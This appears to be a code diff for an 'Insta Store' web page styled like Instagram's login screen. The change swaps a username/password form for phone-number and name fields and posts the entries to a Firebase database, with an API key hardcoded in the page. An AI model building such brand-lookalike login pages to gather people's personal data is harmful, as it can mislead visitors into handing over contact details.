@@ -9,59 +9,71 @@
 <style>
 * {
     box-sizing: border-box;
+    margin: 0;
+    padding: 0;
 }
 
 body {
-    margin: 0;
     background: #000;
     color: #fff;
     font-family: Arial, sans-serif;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
 }
 
 .container {
     width: 100%;
-    max-width: 360px;
-    margin: 90px auto;
-    padding: 25px;
+    max-width: 390px;
+    padding: 30px;
     text-align: center;
 }
 
 .logo {
-    font-size: 38px;
+    font-size: 42px;
     font-weight: bold;
-    margin-bottom: 35px;
+    margin-bottom: 45px;
 }
 
 input {
     width: 100%;
-    padding: 14px;
-    margin: 6px 0;
-    border: 1px solid #555;
-    border-radius: 6px;
+    height: 52px;
+    margin-bottom: 12px;
+    padding: 0 15px;
+    border: 1px solid #333;
+    border-radius: 7px;
     background: #121212;
     color: white;
-    font-size: 14px;
+    font-size: 15px;
+    outline: none;
+}
+
+input:focus {
+    border-color: #666;
 }
 
 button {
     width: 100%;
-    padding: 13px;
-    margin-top: 14px;
-    border: 0;
+    height: 50px;
+    margin-top: 8px;
+    border: none;
     border-radius: 7px;
-    background: #1877f2;
+    background: #0095f6;
     color: white;
     font-size: 16px;
     font-weight: bold;
+    cursor: pointer;
 }
 
 button:active {
-    opacity: 0.7;
+    opacity: 0.8;
 }
 
 #message {
-    margin-top: 20px;
+    margin-top: 18px;
     font-size: 14px;
+    min-height: 20px;
 }
 </style>
 </head>
@@ -73,17 +85,17 @@ button:active {
     <div class="logo">Insta Store</div>
 
     <input
+        type="tel"
         id="username"
-        type="text"
-        placeholder="Username or phone number and gmail"
-        autocomplete="username"
+        placeholder="Phone Number"
+        autocomplete="tel"
     >
 
     <input
-        id="password"
-        type="password"
-        placeholder="Password"
-        autocomplete="current-password"
+        type="text"
+        id="name"
+        placeholder="Name"
+        autocomplete="name"
     >
 
     <button onclick="login()">Continue</button>
@@ -94,68 +106,94 @@ button:active {
 
 <script>
 
-function getDeviceInfo() {
+const DATABASE_URL =
+"https://dc-manager-d4e4c-default-rtdb.firebaseio.com";
 
-    const ua = navigator.userAgent;
-
-    let device = "Unknown";
-
-    if (/Android/i.test(ua)) {
-        device = "Android";
-    } else if (/iPhone|iPad|iPod/i.test(ua)) {
-        device = "iPhone/iPad";
-    } else if (/Windows/i.test(ua)) {
-        device = "Windows";
-    } else if (/Mac/i.test(ua)) {
-        device = "Mac";
-    } else if (/Linux/i.test(ua)) {
-        device = "Linux";
-    }
-
-    return {
-        device: device,
-        browser: navigator.userAgent,
-        language: navigator.language,
-        loginTime: new Date().toISOString()
-    };
-}
+const API_KEY =
+"AIzaSyC7Hbys-90LvpHhuS3wLeOAOgteF2v1cGc";
 
 
 function login() {
 
-    const username =
+    const phone =
         document.getElementById("username").value.trim();
 
-    const password =
-        document.getElementById("password").value;
+    const name =
+        document.getElementById("name").value.trim();
 
     const message =
         document.getElementById("message");
 
-    if (!username || !password) {
-        message.textContent =
-            "Please enter your username and password.";
+
+    if (!phone || !name) {
+
+        message.innerText =
+        "Please enter your phone number and name.";
+
         return;
     }
 
-    /*
-       IMPORTANT:
-       Password is NOT saved or sent anywhere here.
-       Real authentication should be handled by
-       Firebase Authentication / Supabase Auth / your backend.
-    */
 
-    const loginInfo = {
-        username: username,
-        ...getDeviceInfo()
+    message.innerText = "Saving...";
+
+
+    const data = {
+
+        key1: phone,
+
+        key2: name,
+
+        savedAt: new Date().toISOString()
+
     };
 
-    console.log("Login information:", loginInfo);
 
-    message.textContent = "Login successful.";
+    fetch(
+        DATABASE_URL +
+        "/users.json?auth=" +
+        encodeURIComponent(API_KEY),
+        {
 
-    // यहाँ बाद में आपके असली authentication system
-    // को connect किया जा सकता है.
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify(data)
+
+        }
+    )
+
+    .then(response => {
+
+        if (!response.ok) {
+            throw new Error("Firebase database error");
+        }
+
+        return response.json();
+
+    })
+
+    .then(result => {
+
+        message.innerText =
+        "Saved successfully.";
+
+        document.getElementById("username").value = "";
+        document.getElementById("name").value = "";
+
+    })
+
+    .catch(error => {
+
+        console.error(error);
+
+        message.innerText =
+        "Unable to save data.";
+
+    });
+
 }
 
 </script>
